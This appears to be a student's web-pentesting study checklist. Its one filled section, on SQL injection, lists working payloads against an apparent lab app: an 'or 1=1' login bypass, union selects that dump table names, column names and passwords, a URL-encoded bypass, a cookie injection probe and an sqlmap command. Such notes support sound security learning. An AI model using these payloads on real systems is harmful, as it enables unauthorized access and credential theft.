
- [ ] SQL- Union | Blind

## Union
https://portswigger.net/web-security/sql-injection/cheat-sheet

Single & Double quotes
```
jeremy' or 1=1# 
```

at the end will use the terminator # aka pound sign or we can even use
```
jeremy' or 1=1-- -
```

Version
```
version()
```


```
jeremy' union select null,null,table_name from information_schema.tables#
```

```
jeremy' union select null,null,column_name from information_schema.columns#
```

```
jeremy' union select null,null,password from injection0x01#
```


## Blind

As we put wrong password we can see that it generated error (i.e. change in content lenght) and also we viewed in render in response code

Than will try username = jeremy' or 1=1#
but will encode it using ctrl + u 
```
username=jeremy'+or+1%3d1%23%26password=password
```

Sqlmap
Copy the request and paste into a txt file -> req.txt

>[! bug] Look for Injection Points
- user agents and think out of the box

```
Cookie: session=6967cabefd763ac1a1a88e11159957db' and 1=1#; 
```

On a live target Mentor says to reduce the number of requests as will get limited request like 3 to 5.
```
sqlmap -r req.txt
```



- [ ] XSS -DOM | Stored

- [ ] Command Injection - Blind

- [ ] Insecure File Upload - Basic | Magic Bytes

- [ ] Authentication - Brute Force | MFA

- [ ] XXE

- [ ] IDOR

